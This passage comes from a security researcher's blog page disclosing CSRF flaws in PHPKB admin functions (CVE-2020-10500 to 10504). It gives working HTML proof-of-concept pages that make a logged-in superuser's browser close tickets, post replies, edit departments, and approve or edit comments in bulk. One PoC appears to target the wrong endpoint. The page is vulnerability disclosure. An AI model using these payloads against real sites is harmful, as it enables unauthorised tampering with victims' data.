  <li>select the ticket and click on “close”.</li>
</ul>

<p>There is no anti-CSRF protection, I’ve prepared this proof of concept:</p>

<figure class="highlight"><pre><code class="language-html" data-lang="html"><span class="cp">&lt;!DOCTYPE html5&gt;</span>
<span class="nt">&lt;html&gt;</span>
	<span class="nt">&lt;head&gt;</span>
		<span class="nt">&lt;title&gt;</span>Exploit CSRF!<span class="nt">&lt;/title&gt;</span>
		<span class="nt">&lt;script&gt;</span>
		<span class="kd">var</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
		<span class="k">while</span> <span class="p">(</span><span class="nx">i</span> <span class="o">&lt;</span> <span class="mi">500</span><span class="p">)</span> <span class="p">{</span> <span class="o">&lt;!--</span><span class="nx">This</span> <span class="nx">is</span> <span class="nx">the</span> <span class="nx">number</span> <span class="k">of</span> <span class="nx">Tickets</span> <span class="nx">that</span> <span class="nx">will</span> <span class="nx">be</span> <span class="nx">closed</span><span class="o">--&gt;</span>
			<span class="kd">var</span> <span class="nx">xhr</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">XMLHttpRequest</span><span class="p">();</span>
			<span class="nx">xhr</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="dl">"</span><span class="s2">GET</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">[PHPKB]/admin/manage-tickets.php?id=</span><span class="dl">"</span> <span class="o">+</span> <span class="nx">i</span> <span class="o">+</span> <span class="dl">"</span><span class="s2">&amp;action=close</span><span class="dl">"</span><span class="p">)</span>
			<span class="nx">xhr</span><span class="p">.</span><span class="nx">setRequestHeader</span><span class="p">(</span><span class="dl">'</span><span class="s1">Content-type</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">application/x-www-form-urlencoded</span><span class="dl">'</span><span class="p">);</span>
			<span class="nx">xhr</span><span class="p">.</span><span class="nx">withCredentials</span><span class="o">=</span><span class="kc">true</span><span class="p">;</span>
			<span class="nx">xhr</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="kc">null</span><span class="p">);</span>
			<span class="nx">i</span><span class="o">++</span><span class="p">;</span>
		<span class="p">}</span>
		<span class="nt">&lt;/script&gt;</span>
	<span class="nt">&lt;/head&gt;</span>
	<span class="nt">&lt;body&gt;</span>
		<span class="nt">&lt;center&gt;&lt;h1&gt;</span>Requests are going!<span class="nt">&lt;/h1&gt;&lt;/center&gt;</span>
<span class="nt">&lt;/html&gt;</span></code></pre></figure>

<h2 id="cross-site-request-forgery-when-replying-to-a-ticket-cve-2020-10500">Cross-Site Request Forgery when replying to a ticket (CVE-2020-10500)</h2>
<p>Targeted: Superuser</p>

<p>Vulnerable file: admin/reply-ticket.php</p>

<p>Steps required in order to find the vulnerability:</p>
<ul>
  <li>log-in as a Superuser;</li>
  <li>go under “tickets” and click on “open”;</li>
  <li>select the ticket, hit “reply back” and click on “save ticket”.</li>
</ul>

<p>There is no anti-CSRF protection, I’ve prepared this proof of concept:</p>

<figure class="highlight"><pre><code class="language-html" data-lang="html"><span class="cp">&lt;!DOCTYPE html5&gt;</span>
<span class="nt">&lt;html&gt;</span>
<span class="c">&lt;!-- Change the title parameter to edit all the Ticket's reply titles--&gt;</span>
<span class="c">&lt;!-- Change the txtContent parameter to change all the Ticket's reply body--&gt;</span>
	<span class="nt">&lt;head&gt;</span>
		<span class="nt">&lt;title&gt;</span>Exploit CSRF!<span class="nt">&lt;/title&gt;</span>
		<span class="nt">&lt;script&gt;</span>
		<span class="kd">var</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
		<span class="k">while</span> <span class="p">(</span><span class="nx">i</span> <span class="o">&lt;</span> <span class="mi">500</span><span class="p">)</span> <span class="p">{</span> <span class="o">&lt;!--</span> <span class="nx">The</span> <span class="nx">number</span> <span class="k">of</span> <span class="nx">Tickets</span> <span class="nx">that</span> <span class="nx">will</span> <span class="nx">be</span> <span class="nx">replied</span><span class="o">--&gt;</span>
			<span class="kd">var</span> <span class="nx">xhr</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">XMLHttpRequest</span><span class="p">();</span> 
			<span class="nx">xhr</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="dl">"</span><span class="s2">POST</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">[PHPKB]/admin/reply-ticket.php</span><span class="dl">"</span><span class="p">)</span>
			<span class="nx">xhr</span><span class="p">.</span><span class="nx">setRequestHeader</span><span class="p">(</span><span class="dl">'</span><span class="s1">Content-type</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">application/x-www-form-urlencoded</span><span class="dl">'</span><span class="p">);</span>
			<span class="nx">xhr</span><span class="p">.</span><span class="nx">withCredentials</span><span class="o">=</span><span class="kc">true</span><span class="p">;</span>
			<span class="kd">var</span> <span class="nx">params</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">title=titleticket&amp;txtContent=replytext&amp;close_ticket=yes&amp;type=public&amp;nstate1=no&amp;nstate4=no&amp;nstate7=no&amp;pub_state=1&amp;pri_state=0&amp;keywords=&amp;summary=&amp;tid=</span><span class="dl">"</span> <span class="o">+</span> <span class="nx">i</span> <span class="o">+</span> <span class="dl">"</span><span class="s2">&amp;for_preview_section=true&amp;from=&amp;p=&amp;Submit=Send+Reply</span><span class="dl">"</span>
			<span class="nx">xhr</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="nx">params</span><span class="p">);</span>
			<span class="nx">i</span><span class="o">++</span><span class="p">;</span>
		<span class="p">}</span>
		<span class="nt">&lt;/script&gt;</span>
	<span class="nt">&lt;/head&gt;</span>
	<span class="nt">&lt;body&gt;</span>
		<span class="nt">&lt;center&gt;&lt;h1&gt;</span>Requests are going!<span class="nt">&lt;/h1&gt;&lt;/center&gt;</span>
<span class="nt">&lt;/html&gt;</span></code></pre></figure>

<h2 id="cross-site-request-forgery-when-editing-a-department-cve-2020-10501">Cross-Site Request Forgery when editing a department (CVE-2020-10501)</h2>
<p>Targeted: Superuser</p>

<p>Vulnerable file: admin/manage-departments.php</p>

<p>Steps required in order to find the vulnerability:</p>
<ul>
  <li>log-in as a Superuser;</li>
  <li>go under “tickets” and click on “department”;</li>
  <li>click on “edit”, then on “save department”.</li>
</ul>

<p>There is no anti-CSRF protection, I’ve prepared this proof of concept:</p>

<figure class="highlight"><pre><code class="language-html" data-lang="html"><span class="cp">&lt;!DOCTYPE html5&gt;</span>
<span class="nt">&lt;html&gt;</span>
<span class="c">&lt;!-- Change the name parameter to edit all the deparments's names --&gt;</span>
	<span class="nt">&lt;head&gt;</span>
		<span class="nt">&lt;title&gt;</span>Exploit CSRF!<span class="nt">&lt;/title&gt;</span>
		<span class="nt">&lt;script&gt;</span>
		<span class="kd">var</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
		<span class="k">while</span> <span class="p">(</span><span class="nx">i</span> <span class="o">&lt;</span> <span class="mi">500</span><span class="p">)</span> <span class="p">{</span> <span class="o">&lt;!--</span> <span class="nx">The</span> <span class="nx">number</span> <span class="k">of</span> <span class="nx">Tickets</span> <span class="nx">that</span> <span class="nx">will</span> <span class="nx">be</span> <span class="nx">replied</span><span class="o">--&gt;</span>
			<span class="kd">var</span> <span class="nx">xhr</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">XMLHttpRequest</span><span class="p">();</span> 
			<span class="nx">xhr</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="dl">"</span><span class="s2">POST</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">[PHPKB]/admin/reply-ticket.php</span><span class="dl">"</span><span class="p">)</span>
			<span class="nx">xhr</span><span class="p">.</span><span class="nx">setRequestHeader</span><span class="p">(</span><span class="dl">'</span><span class="s1">Content-type</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">application/x-www-form-urlencoded</span><span class="dl">'</span><span class="p">);</span>
			<span class="nx">xhr</span><span class="p">.</span><span class="nx">withCredentials</span><span class="o">=</span><span class="kc">true</span><span class="p">;</span>
			<span class="kd">var</span> <span class="nx">params</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">name=depname&amp;show=yes&amp;submit_department=Save+Department&amp;id=</span><span class="dl">"</span> <span class="o">+</span> <span class="nx">i</span> <span class="o">+</span> <span class="dl">"</span><span class="s2">&amp;action=edit</span><span class="dl">"</span>
			<span class="nx">xhr</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="nx">params</span><span class="p">);</span>
			<span class="nx">i</span><span class="o">++</span><span class="p">;</span>
		<span class="p">}</span>
		<span class="nt">&lt;/script&gt;</span>
	<span class="nt">&lt;/head&gt;</span>
	<span class="nt">&lt;body&gt;</span>
		<span class="nt">&lt;center&gt;&lt;h1&gt;</span>Requests are going!<span class="nt">&lt;/h1&gt;&lt;/center&gt;</span>
<span class="nt">&lt;/html&gt;</span></code></pre></figure>

<h2 id="cross-site-request-forgery-when-approving-a-new-comment-cve-2020-10502">Cross-Site Request Forgery when approving a new comment (CVE-2020-10502)</h2>
<p>Targeted: Superuser</p>

<p>Vulnerable file: admin/manage-comments.php</p>

<p>Steps required in order to find the vulnerability:</p>
<ul>
  <li>log-in as a Superuser;</li>
  <li>go under “comments” and click on “pending”;</li>
  <li>select the comment, then click on “approve”.</li>
</ul>

<p>There is no anti-CSRF protection, I’ve prepared this proof of concept:</p>

<figure class="highlight"><pre><code class="language-html" data-lang="html"><span class="cp">&lt;!DOCTYPE html5&gt;</span>
<span class="nt">&lt;html&gt;</span>
	<span class="nt">&lt;head&gt;</span>
		<span class="nt">&lt;title&gt;</span>Exploit CSRF!<span class="nt">&lt;/title&gt;</span>
		<span class="nt">&lt;script&gt;</span>
		<span class="kd">var</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
		<span class="k">while</span> <span class="p">(</span><span class="nx">i</span> <span class="o">&lt;</span> <span class="mi">500</span><span class="p">)</span> <span class="p">{</span> <span class="o">&lt;!--</span><span class="nx">This</span> <span class="nx">is</span> <span class="nx">the</span> <span class="nx">number</span> <span class="k">of</span> <span class="nx">comments</span> <span class="nx">that</span> <span class="nx">will</span> <span class="nx">be</span> <span class="nx">approved</span> <span class="o">--&gt;</span>
			<span class="kd">var</span> <span class="nx">xhr</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">XMLHttpRequest</span><span class="p">();</span>
			<span class="nx">xhr</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="dl">"</span><span class="s2">GET</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">[PHPKB]/admin/manage-comments.php?cid=</span><span class="dl">"</span> <span class="o">+</span> <span class="nx">i</span> <span class="o">+</span> <span class="dl">"</span><span class="s2">&amp;action=approve</span><span class="dl">"</span><span class="p">)</span>
			<span class="nx">xhr</span><span class="p">.</span><span class="nx">setRequestHeader</span><span class="p">(</span><span class="dl">'</span><span class="s1">Content-type</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">application/x-www-form-urlencoded</span><span class="dl">'</span><span class="p">);</span>
			<span class="nx">xhr</span><span class="p">.</span><span class="nx">withCredentials</span><span class="o">=</span><span class="kc">true</span><span class="p">;</span>
			<span class="nx">xhr</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="kc">null</span><span class="p">);</span>
			<span class="nx">i</span><span class="o">++</span><span class="p">;</span>
		<span class="p">}</span>
		<span class="nt">&lt;/script&gt;</span>
	<span class="nt">&lt;/head&gt;</span>
	<span class="nt">&lt;body&gt;</span>
		<span class="nt">&lt;center&gt;&lt;h1&gt;</span>Requests are going!<span class="nt">&lt;/h1&gt;&lt;/center&gt;</span>
<span class="nt">&lt;/html&gt;</span></code></pre></figure>

<h2 id="cross-site-request-forgery-when-disapproving-a-new-comment-cve-2020-10503">Cross-Site Request Forgery when disapproving a new comment (CVE-2020-10503)</h2>
<p>Targeted: Superuser</p>

<p>Vulnerable file: admin/manage-comments.php</p>

<p>Steps required in order to find the vulnerability:</p>

<ul>
  <li>log-in as a Superuser;</li>
  <li>go under “comments” and click on “approved”;</li>
  <li>select the comment, then click on “disapprove”.</li>
</ul>

<p>There is no anti-CSRF protection, I’ve prepared this proof of concept:</p>

<figure class="highlight"><pre><code class="language-html" data-lang="html"><span class="cp">&lt;!DOCTYPE html5&gt;</span>
<span class="nt">&lt;html&gt;</span>
	<span class="nt">&lt;head&gt;</span>
		<span class="nt">&lt;title&gt;</span>Exploit CSRF!<span class="nt">&lt;/title&gt;</span>
		<span class="nt">&lt;script&gt;</span>
		<span class="kd">var</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
		<span class="k">while</span> <span class="p">(</span><span class="nx">i</span> <span class="o">&lt;</span> <span class="mi">500</span><span class="p">)</span> <span class="p">{</span> <span class="o">&lt;!--</span><span class="nx">This</span> <span class="nx">is</span> <span class="nx">the</span> <span class="nx">number</span> <span class="k">of</span> <span class="nx">comments</span> <span class="nx">that</span> <span class="nx">will</span> <span class="nx">be</span> <span class="nx">disapproved</span> <span class="o">--&gt;</span>
			<span class="kd">var</span> <span class="nx">xhr</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">XMLHttpRequest</span><span class="p">();</span>
			<span class="nx">xhr</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="dl">"</span><span class="s2">GET</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">[PHPKB]/admin/manage-comments.php?cid=</span><span class="dl">"</span> <span class="o">+</span> <span class="nx">i</span> <span class="o">+</span> <span class="dl">"</span><span class="s2">&amp;action=disapprove</span><span class="dl">"</span><span class="p">)</span>
			<span class="nx">xhr</span><span class="p">.</span><span class="nx">setRequestHeader</span><span class="p">(</span><span class="dl">'</span><span class="s1">Content-type</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">application/x-www-form-urlencoded</span><span class="dl">'</span><span class="p">);</span>
			<span class="nx">xhr</span><span class="p">.</span><span class="nx">withCredentials</span><span class="o">=</span><span class="kc">true</span><span class="p">;</span>
			<span class="nx">xhr</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="kc">null</span><span class="p">);</span>
			<span class="nx">i</span><span class="o">++</span><span class="p">;</span>
		<span class="p">}</span>
		<span class="nt">&lt;/script&gt;</span>
	<span class="nt">&lt;/head&gt;</span>
	<span class="nt">&lt;body&gt;</span>
		<span class="nt">&lt;center&gt;&lt;h1&gt;</span>Requests are going!<span class="nt">&lt;/h1&gt;&lt;/center&gt;</span>
<span class="nt">&lt;/html&gt;</span></code></pre></figure>

<h2 id="cross-site-request-forgery-when-editing-a-comment-cve-2020-10504">Cross-Site Request Forgery when editing a comment (CVE-2020-10504)</h2>
<p>Targeted: Superuser</p>

<p>Vulnerable file: admin/edit-comments.php</p>

<p>Steps required in order to find the vulnerability:</p>
<ul>
  <li>log-in as a Superuser;</li>
  <li>go under “comments” and click on “pending”;</li>
  <li>select the comment, click on “edit”, then on “save comment”.</li>
</ul>

<p>There is no anti-CSRF protection, I’ve prepared this proof of concept:</p>

<figure class="highlight"><pre><code class="language-html" data-lang="html"><span class="cp">&lt;!DOCTYPE html5&gt;</span>
<span class="nt">&lt;html&gt;</span>
<span class="c">&lt;!-- Change name parameter to set the username of the person posting a comment --&gt;</span>
<span class="c">&lt;!-- Change the email parameter to change the user's email that is posting a comment--&gt;</span>
<span class="c">&lt;!-- Change the comment parameter to change user's comment --&gt;</span>
	<span class="nt">&lt;head&gt;</span>
		<span class="nt">&lt;title&gt;</span>Exploit CSRF!<span class="nt">&lt;/title&gt;</span>
		<span class="nt">&lt;script&gt;</span>
		<span class="kd">var</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
		<span class="k">while</span> <span class="p">(</span><span class="nx">i</span> <span class="o">&lt;</span> <span class="mi">500</span><span class="p">)</span> <span class="p">{</span> <span class="o">&lt;!--</span> <span class="nx">The</span> <span class="nx">number</span> <span class="k">of</span> <span class="nx">categories</span> <span class="nx">that</span> <span class="nx">will</span> <span class="nx">be</span> <span class="nx">edited</span> <span class="o">--&gt;</span>
			<span class="kd">var</span> <span class="nx">xhr</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">XMLHttpRequest</span><span class="p">();</span> 
			<span class="nx">xhr</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="dl">"</span><span class="s2">POST</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">[PHPKB]/admin/edit-comment.php</span><span class="dl">"</span><span class="p">)</span>
			<span class="nx">xhr</span><span class="p">.</span><span class="nx">setRequestHeader</span><span class="p">(</span><span class="dl">'</span><span class="s1">Content-type</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">application/x-www-form-urlencoded</span><span class="dl">'</span><span class="p">);</span>
			<span class="nx">xhr</span><span class="p">.</span><span class="nx">withCredentials</span><span class="o">=</span><span class="kc">true</span><span class="p">;</span>
			<span class="kd">var</span> <span class="nx">params</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">name=test&amp;email=test@test.com&amp;comment=test&amp;status=approved&amp;type=&amp;cid=</span><span class="dl">"</span> <span class="o">+</span> <span class="nx">i</span> <span class="o">+</span> <span class="dl">"</span><span class="s2">&amp;submit=Save+Changes</span><span class="dl">"</span>
			<span class="nx">xhr</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="nx">params</span><span class="p">);</span>
			<span class="nx">i</span><span class="o">++</span><span class="p">;</span>
		<span class="p">}</span>
		<span class="nt">&lt;/script&gt;</span>
	<span class="nt">&lt;/head&gt;</span>
	<span class="nt">&lt;body&gt;</span>
		<span class="nt">&lt;center&gt;&lt;h1&gt;</span>Requests are going!<span class="nt">&lt;/h1&gt;&lt;/center&gt;</span>
<span class="nt">&lt;/html&gt;</span></code></pre></figure>

<p>That’s all folks, see you next time!</p>

</div>



<div class="pagination">
  
    <a href="/telecomitalia" class="left arrow">&#8592;</a>
  
  
    <a href="/phpkb2" class="right arrow">&#8594;</a>
  

  <a href="#" class="top">Top</a>
</div>
    </main>

    <footer>
  <span>
    2019 - <time datetime="2021-06-18 19:25:00 +0000">2021 </time>Antonio Cannito &copy;
  </span>
</footer>

  </body>
</html>
